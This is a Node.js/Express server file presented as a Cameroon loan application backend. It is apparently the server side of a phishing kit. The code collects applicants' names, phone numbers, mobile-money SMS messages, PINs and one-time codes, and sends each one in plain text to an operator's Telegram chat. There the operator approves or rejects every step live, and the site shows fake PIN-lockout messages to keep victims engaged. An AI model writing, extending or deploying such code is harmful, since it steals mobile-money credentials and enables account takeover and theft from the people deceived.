require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const applications = {};

function generateRef() {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
}

async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) console.error('Telegram API error:', data);
    else console.log('✅ Telegram message sent');
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

// ─── Health ───
app.get('/api/health', (req, res) => res.json({ ok: true }));

// ─── Submit Application ───
app.post('/api/send-application', async (req, res) => {
  const data = req.body.applicationData;
  const appId = `${data.phone}_${Date.now()}`;
  const ref = generateRef();

  applications[appId] = {
    ...data,
    ref,
    smsStatus: 'pending',
    pinStatus: 'pending',
    otpStatus: 'pending',
    pinAttempts: 0,
    maxPinAttempts: 3,
    pinBlockedUntil: null,
    createdAt: new Date().toISOString()
  };

  const message = `NEW LOAN APPLICATION (CAMEROON)\nID: ${appId}\nPhone: +237${data.phone}\nAmount: XAF ${data.loanAmount}\nTerm: ${data.loanTerm}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject the SMS step:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, applicationId: appId, status: 'waiting_sms' });
});

// ─── Send / Resend SMS ───
app.post('/api/send-momo-message', async (req, res) => {
  const { applicationId, phone, momoMessage } = req.body.momoData;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.momoMessage = momoMessage;
  app.smsStatus = 'pending';

  const message = `SMS VERIFICATION (CAMEROON)\nID: ${applicationId}\nPhone: +237${phone}\n\nMessage:\n${momoMessage}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ ok: true });
});

app.post('/api/resend-sms', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.smsStatus = 'pending';
  const message = `SMS RESUBMITTED (CAMEROON)\nID: ${applicationId}\nMessage:\n${app.momoMessage || '(empty)'}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ ok: true });
});

// ─── Send PIN ───
app.post('/api/send-pin', async (req, res) => {
  const { applicationId, pin } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
    const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
    return res.status(429).json({
      ok: false,
      blocked: true,
      message: `PIN blocked. Try again in ${Math.ceil(remaining / 60)} minutes.`
    });
  }
  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
    app.pinAttempts = 0;
    app.pinBlockedUntil = null;
  }

  app.pin = pin;
  app.pinStatus = 'pending';

  const message = `PIN VERIFICATION (CAMEROON)\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref: app.ref }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ ok: true });
});

// ─── Send OTP ───
app.post('/api/send-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.otp = otp;
  app.otpStatus = 'pending';

  const message = `OTP VERIFICATION (CAMEROON)\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ ok: true });
});

// ─── Status check (for polling) ───
app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let status = 'pending';
  let remainingAttempts = null;
  let blocked = false;

  if (req.params.step === 'sms') status = app.smsStatus;
  else if (req.params.step === 'pin') {
    status = app.pinStatus;
    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
    blocked = app.pinStatus === 'blocked' ||
      (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
  } else if (req.params.step === 'otp') status = app.otpStatus;

  res.json({ ok: true, status, remainingAttempts, blocked });
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  console.log('📩 Webhook received');

  if (update.callback_query) {
    const query = update.callback_query;
    let data;
    try { data = JSON.parse(query.data); }
    catch (e) { console.error('Bad callback data:', query.data); return res.sendStatus(200); }

    const { a, s, ref } = data;
    let appId = null;
    for (const id in applications) {
      if (applications[id].ref === ref) { appId = id; break; }
    }
    if (!appId) { console.error('App not found for ref:', ref); return res.sendStatus(200); }

    const app = applications[appId];

    if (s === 'SMS') {
      app.smsStatus = a === 'YES' ? 'approved' : 'rejected';
    } else if (s === 'PIN') {
      if (a === 'YES') {
        app.pinStatus = 'approved';
      } else {
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinStatus = 'blocked';
          app.pinBlockedUntil = new Date(Date.now() + 30 * 60 * 1000).toISOString();  // 30 min
        } else {
          app.pinStatus = 'rejected';
        }
      }
    } else if (s === 'OTP') {
      app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
    });

    await sendTelegramMessage(`Status Update (CAMEROON)\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;
    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        await sendTelegramMessage(`Total applications: ${total}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = 'Recent applications:\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `${id} — SMS: ${app.smsStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus}\n`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage('Commands: /stats, /list');
      }
    }
  }
  res.sendStatus(200);
});

// ─── Fallback ───
app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
